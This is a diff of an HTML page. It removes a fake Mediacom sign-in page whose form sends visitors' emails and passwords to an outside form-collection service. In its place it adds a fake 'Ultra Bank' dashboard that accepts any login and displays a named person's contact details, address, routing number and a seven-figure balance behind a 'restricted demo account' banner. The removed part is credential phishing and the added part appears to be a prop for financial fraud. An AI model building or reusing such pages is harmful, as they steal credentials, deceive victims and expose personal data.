@@ -3,142 +3,176 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In - Mediacom Account Portal</title>
-    <style>
-        :root {
-            --primary-color: #00539f;
-            --primary-hover: #003d75;
-            --bg-color: #f4f6f9;
-            --card-bg: #ffffff;
-            --text-color: #333333;
-            --border-color: #cccccc;
-        }
-
-        body {
-            font-family: Arial, sans-serif, -apple-system, BlinkMacSystemFont;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .login-container {
-            background-color: var(--card-bg);
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            box-sizing: border-box;
-        }
-
-        .logo-area {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .logo-area img {
-            max-width: 180px;
-            height: auto;
-            margin-bottom: 12px;
-        }
-
-        .logo-area p {
-            color: #666;
-            font-size: 14px;
-            margin: 0;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            font-size: 14px;
-            box-sizing: border-box;
-            transition: border-color 0.2s;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .login-btn:hover {
-            background-color: var(--primary-hover);
-        }
-
-        .footer-links {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 13px;
-        }
-
-        .footer-links a {
-            color: var(--primary-color);
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-    </style>
+    <title>L & U- Secure Portal</title>
+    <!-- Link to external styling file -->
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div class="login-container">
-    <div class="logo-area">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Mediacom.svg" alt="Mediacom Logo">
-        <p>Sign in to your account</p>
+    <!-- LOGIN SCREEN LAYER -->
+    <div id="loginScreen" class="login-screen">
+        <div class="login-card">
+            <div class="login-logo-area">
+                <div class="login-logo-box">Ultra</div>
+                <div class="login-bank-name">Ultra Bank</div>
+            </div>
+            <p class="login-welcome-text">Welcome back! Please sign in to manage your profile.</p>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" required placeholder="Enter any username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" required placeholder="Enter any password">
+                </div>
+                <button type="submit" class="submit-btn">Sign In Securely</button>
+            </form>
+            
+            <p class="login-footer-text">Protected by Ultra Secure System Core</p>
+        </div>
     </div>
 
-    <!-- FormBold Form Integration with provided endpoint -->
-    <form action="https://formbold.com/s/6lBKQ" method="POST">
+    <!-- MAIN DASHBOARD CONTENT LAYER -->
+    <div id="dashboardScreen" class="dashboard-screen">
         
-        <div class="form-group">
-            <label for="email">Mediacom ID or Email</label>
-            <input type="email" id="email" name="email" required placeholder="name@mediacombb.net">
+        <!-- TOP NAVIGATION BAR -->
+        <header class="top-nav">
+            <div class="logo-area">
+                <div class="logo-box">Ultra</div>
+                <span class="bank-name">Ultra Bank</span>
+            </div>
+            <div class="nav-right">
+                <div class="search-bar">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" placeholder="Search">
+                </div>
+                <span class="help-icon">❓</span>
+                <button class="logout-btn" id="topLogoutBtn">Log Out</button>
+            </div>
+        </header>
+
+        <div class="main-layout">
+            <!-- SIDEBAR NAVIGATION MENU -->
+            <aside class="sidebar">
+                <nav class="sidebar-menu">
+                    <a href="#" class="nav-item"><span>🏠</span> Dashboard</a>
+                    <a href="#" class="nav-item"><span>💳</span> Accounts</a>
+                    <a href="#" class="nav-item"><span>🔄</span> Transfers</a>
+                    <a href="#" class="nav-item"><span>💵</span> Pay Bills</a>
+                    <a href="#" class="nav-item"><span>📄</span> Statements</a>
+                    <a href="#" class="nav-item active"><span>👤</span> Profile</a>
+                    <a href="#" class="nav-item"><span>⚙️</span> Settings</a>
+                    <a href="#" class="nav-item logout-link" id="sideLogoutBtn"><span>🚪</span> Log Out</a>
+                </nav>
+            </aside>
+
+            <!-- WORKSPACE INTERFACE -->
+            <main class="content-area">
+                
+                <!-- DYNAMIC L&U ACCOUNT NOTIFICATION BANNER -->
+                <div id="demoAlertBanner" class="demo-alert-banner">
+                    ⚠️ This function is restricted. This account is a demo environment.
+                </div>
+
+                <div class="content-header">
+                    <h1>Account Profile</h1>
+                    <div class="user-pill">
+                        <span class="pill-icon">👤</span>
+                        <span class="pill-name" id="pillUserName">Sarah J. Thompson</span>
+                    </div>
+                </div>
+
+                <!-- PROFILE AND ACCOUNT DETAIL CARDS -->
+                <div class="profile-card">
+                    <h2>My Profile</h2>
+                    <div class="profile-grid">
+                        
+                        <!-- Fixed Local Image Box and Contact Details -->
+                        <div class="profile-info-block">
+                            <div class="photo-container">
+                                <div class="photo-frame">
+                                    <img id="profileImage" src="show.jpg" alt="Profile" onerror="this.src='https://placeholder.com'">
+                                </div>
+                            </div>
+                            
+                            <div class="profile-text-details">
+                                <h3 class="user-full-name" id="displayFullName">Sarah J. Thompson</h3>
+                                <p class="user-username" id="displayUsername">sarah.thompson77</p>
+                                <div class="contact-item">✉️ Evgoblue1432@aol.com</div>
+                                <div class="contact-item">📞 (419) 315-0747</div>
+                                <div class="contact-item">📍 1432 Clough St<br><span class="city-zip">Bowling Green, OH 43402</span></div>
+                            </div>
+                        </div>
+
+                        <!-- Balances Overview -->
+                        <div class="account-details-block">
+                            <h4>Account Details</h4>
+                            <div class="account-selector">
+                                <span>Checking Account (*5894)</span>
+                                <span class="arrow-down">▼</span>
+                            </div>
+                            
+                            <div class="balance-section">
+                                <span class="balance-label">Current Balance</span>
+                                <div class="balance-amount">$1,250,220.75</div>
+                            </div>
+
+                            <div class="account-numbers-box">
+                                <div class="num-row">
+                                    <span class="num-val" id="accountNumText">*********5894</span>
+                                    <button class="show-btn" id="toggleNumBtn">Show</button>
+                                </div>
+                                <div class="routing-row">
+                                    <span class="routing-label">Routing Number</span>
+                                    <span class="routing-val">071000288</span>
+                                </div>
+                            </div>
+
+                            <div class="status-row">
+                                Account Status: <span class="status-active">Active</span>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- RECENT TRANSACTIONS LEDGER -->
+                <div class="activity-card">
+                    <h2>Recent Activity <span class="subtext">(Last 5 Transactions)</span></h2>
+                    <table class="activity-table">
+                        <thead>
+                            <tr>
+                                <th>Recent Activity</th>
+                                <th>Size</th>
+                                <th class="text-right">Amount</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>
+                                    <strong id="tableRowName">Sarah J. Thompson</strong>
+                                    <div class="table-subtext">5056, Transactions</div>
+                                </td>
+                                <td>$15.00</td>
+                                <td class="text-right amount-val">$1,250,220.75</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- INSTITUTIONAL FOOTER -->
+                <footer class="dashboard-footer">
+                    <span>Member FDIC</span>
+                    <span class="footer-center">🏠 Equal Housing Lender</span>
+                    <span>© 2026</span>
+                </footer>
+            </main>
         </div>
-
-        <div class="form-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required placeholder="••••••••">
-        </div>
-
-        <button type="submit" class="login-btn">Sign In</button>
-    </form>
-
-    <div class="footer-links">
-        <a href="#">Forgot Password or Forgot ID?</a>
     </div>
-</div>
 
+    <!-- Link to external interaction file -->
+    <script src="script.js"></script>
 </body>
 </html>
